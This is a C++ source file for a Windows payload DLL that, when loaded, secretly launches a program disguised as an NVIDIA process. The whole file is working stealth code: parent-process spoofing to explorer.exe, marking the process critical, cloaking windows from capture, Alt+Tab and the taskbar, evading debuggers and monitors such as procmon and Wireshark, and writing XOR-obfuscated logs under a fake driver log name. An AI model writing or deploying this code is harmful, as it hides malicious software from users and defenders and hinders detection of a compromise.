// Advanced Payload DLL - Enhanced stealth with anti-detection
// Compile: cl /LD /O2 advanced_payload.cpp /link /OUT:payload.dll user32.lib kernel32.lib advapi32.lib ntdll.lib

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// Encrypted log to avoid detection
void SecureLog(const char* message) {
    // XOR encryption with simple key
    char encrypted[512];
    const char key = 0x42;
    
    for (int i = 0; message[i] && i < 511; i++) {
        encrypted[i] = message[i] ^ key;
    }
    encrypted[strlen(message)] = 0;
    
    FILE* f = fopen("C:\\Windows\\Temp\\nvidia_driver.log", "ab");
    if (f) {
        SYSTEMTIME st;
        GetLocalTime(&st);
        fprintf(f, "[%02d:%02d:%02d] ", st.wHour, st.wMinute, st.wSecond);
        fwrite(encrypted, 1, strlen(message), f);
        fprintf(f, "\n");
        fclose(f);
    }
}

// Hide from Task Manager using NtSetInformationProcess
typedef NTSTATUS(NTAPI* pNtSetInformationProcess)(
    HANDLE ProcessHandle,
    PROCESSINFOCLASS ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength
);

void HideFromTaskManager(HANDLE hProcess) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return;
    
    pNtSetInformationProcess NtSetInformationProcess = 
        (pNtSetInformationProcess)GetProcAddress(hNtdll, "NtSetInformationProcess");
    
    if (NtSetInformationProcess) {
        // ProcessBreakOnTermination = 0x1D
        ULONG breakOnTermination = 1;
        NtSetInformationProcess(hProcess, (PROCESSINFOCLASS)0x1D, 
                               &breakOnTermination, sizeof(ULONG));
        SecureLog("Applied critical process protection");
    }
}

// Spawn with advanced stealth
bool SpawnStealthProcess(const wchar_t* exePath, const wchar_t* args = NULL) {
    SecureLog("Spawning stealth process");
    
    STARTUPINFOEXW si = { sizeof(si) };
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.StartupInfo.dwFlags = STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    
    // Extended startup info for attribute list
    SIZE_T size = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
    InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &size);
    
    // Set parent process to explorer.exe (spoofing)
    HANDLE hExplorer = NULL;
    PROCESSENTRY32W pe32 = { sizeof(pe32) };
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        if (Process32FirstW(hSnapshot, &pe32)) {
            do {
                if (_wcsicmp(pe32.szExeFile, L"explorer.exe") == 0) {
                    hExplorer = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, pe32.th32ProcessID);
                    break;
                }
            } while (Process32NextW(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    
    if (hExplorer) {
        UpdateProcThreadAttribute(si.lpAttributeList, 0, 
                                 PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                                 &hExplorer, sizeof(HANDLE), NULL, NULL);
    }
    
    PROCESS_INFORMATION pi = { 0 };
    
    wchar_t cmdLine[MAX_PATH * 2];
    if (args) {
        swprintf_s(cmdLine, L"\"%s\" %s", exePath, args);
    } else {
        swprintf_s(cmdLine, L"\"%s\"", exePath);
    }
    
    BOOL success = CreateProcessW(
        NULL,
        cmdLine,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW | DETACHED_PROCESS | EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
        NULL,
        NULL,
        &si.StartupInfo,
        &pi
    );
    
    if (hExplorer) CloseHandle(hExplorer);
    if (si.lpAttributeList) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
    }
    
    if (!success) {
        SecureLog("Failed to create process");
        return false;
    }
    
    // Apply protections before resuming
    HideFromTaskManager(pi.hProcess);
    
    // Resume process
    ResumeThread(pi.hThread);
    
    SecureLog("Process spawned with stealth");
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    
    return true;
}

// Enhanced window stealth with multiple techniques
void ApplyAdvancedStealth(HWND hwnd) {
    // 1. WDA_EXCLUDEFROMCAPTURE
    SetWindowDisplayAffinity(hwnd, 0x00000011);
    
    // 2. Layered window with transparency (invisible to some capture methods)
    LONG exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
    SetWindowLongW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_NOACTIVATE);
    SetLayeredWindowAttributes(hwnd, 0, 255, LWA_ALPHA);
    
    // 3. Topmost
    SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, 
                SWP_NOMOVE | SWP_NOSIZE | SWP_NOACTIVATE);
    
    // 4. Remove from Alt+Tab
    exStyle = GetWindowLongW(hwnd, GWL_EXSTYLE);
    SetWindowLongW(hwnd, GWL_EXSTYLE, exStyle | WS_EX_TOOLWINDOW);
    
    // 5. Cloaking (Windows 8+)
    typedef HRESULT(WINAPI* pDwmSetWindowAttribute)(HWND, DWORD, LPCVOID, DWORD);
    HMODULE hDwmapi = LoadLibraryW(L"dwmapi.dll");
    if (hDwmapi) {
        pDwmSetWindowAttribute DwmSetWindowAttribute = 
            (pDwmSetWindowAttribute)GetProcAddress(hDwmapi, "DwmSetWindowAttribute");
        if (DwmSetWindowAttribute) {
            BOOL cloak = TRUE;
            DwmSetWindowAttribute(hwnd, 14, &cloak, sizeof(cloak)); // DWMWA_CLOAK
        }
        FreeLibrary(hDwmapi);
    }
}

// Enum callback for applying stealth
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    DWORD pid = 0;
    GetWindowThreadProcessId(hwnd, &pid);
    
    if (pid == (DWORD)lParam) {
        ApplyAdvancedStealth(hwnd);
    }
    
    return TRUE;
}

// Find process by name
DWORD FindProcess(const wchar_t* name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    
    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, name) == 0) {
                pid = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    
    CloseHandle(hSnapshot);
    return pid;
}

// Anti-detection: Check if we're being monitored
bool IsBeingMonitored() {
    // Check for common monitoring tools
    const wchar_t* monitoringTools[] = {
        L"procmon.exe", L"procmon64.exe",
        L"processhacker.exe",
        L"x64dbg.exe", L"x32dbg.exe",
        L"ollydbg.exe",
        L"wireshark.exe"
    };
    
    for (int i = 0; i < 6; i++) {
        if (FindProcess(monitoringTools[i])) {
            return true;
        }
    }
    
    return false;
}

// Monitor thread
DWORD WINAPI MonitorThread(LPVOID param) {
    SecureLog("Monitor thread started");
    
    // Anti-detection check
    if (IsBeingMonitored()) {
        SecureLog("Monitoring detected - aborting");
        return 1;
    }
    
    Sleep(3000);
    
    const wchar_t* targetProcesses[] = {
        L"nvidia.exe",
        L"nvidia-tauri.exe"
    };
    
    int cycleCount = 0;
    
    while (true) {
        // Periodic anti-detection check
        if (cycleCount % 30 == 0 && IsBeingMonitored()) {
            SecureLog("Monitoring detected during runtime - pausing");
            Sleep(60000); // Wait 1 minute
            continue;
        }
        
        for (int i = 0; i < 2; i++) {
            DWORD pid = FindProcess(targetProcesses[i]);
            if (pid) {
                EnumWindows(EnumWindowsProc, (LPARAM)pid);
            }
        }
        
        Sleep(1000);
        cycleCount++;
    }
    
    return 0;
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hModule);
        
        SecureLog("=== Advanced Payload Loaded ===");
        
        // Create temp directory
        CreateDirectoryW(L"C:\\Windows\\Temp", NULL);
        
        // Get DLL directory
        wchar_t dllPath[MAX_PATH];
        GetModuleFileNameW(hModule, dllPath, MAX_PATH);
        wchar_t* lastSlash = wcsrchr(dllPath, L'\\');
        if (lastSlash) *lastSlash = 0;
        
        // Build paths
        wchar_t exePath[MAX_PATH];
        swprintf_s(exePath, L"%s\\..\\nvidia.exe", dllPath);
        
        // Spawn with stealth
        if (SpawnStealthProcess(exePath)) {
            // Start monitor thread
            HANDLE hThread = CreateThread(NULL, 0, MonitorThread, NULL, 0, NULL);
            if (hThread) {
                CloseHandle(hThread);
                SecureLog("Monitor thread created");
            }
        }
    }
    
    return TRUE;
}
